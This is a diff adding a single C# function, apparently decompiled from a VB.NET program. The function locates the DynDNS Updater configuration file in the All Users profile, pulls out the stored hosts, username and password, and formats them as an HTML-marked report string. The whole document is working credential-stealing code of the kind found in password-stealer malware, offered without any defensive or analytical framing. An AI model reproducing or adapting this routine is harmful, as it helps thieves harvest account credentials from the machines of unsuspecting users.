@@ -1,0 +1,32 @@
+public static string sDynDns()
+{
+	string sFile = Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users", 1, -1, CompareMethod.Binary) + "\\DynDNS\\Updater\\config.dyndns";
+	string sInhalt = Ftp.ReadFile(sFile);
+	string text = Ftp.Cut(sInhalt, "[Hosts]", "Count=");
+	string text2 = Ftp.Cut(sInhalt, "Username=", "\r\n");
+	string text3 = Ftp.Cut(sInhalt, "Password=", "\r\n");
+	bool flag = Operators.CompareString(text3, "", false) != 0;
+	string result;
+	if (flag)
+	{
+		try
+		{
+			result = string.Concat(new string[]
+			{
+				"Hosts:",
+				text,
+				"\r\nUsername: ",
+				text2,
+				"\r\nPassword: ",
+				text3,
+				" (Encrypt)<br />"
+			});
+		}
+		catch (Exception expr_D3)
+		{
+			ProjectData.SetProjectError(expr_D3);
+			ProjectData.ClearProjectError();
+		}
+	}
+	return result;
+}
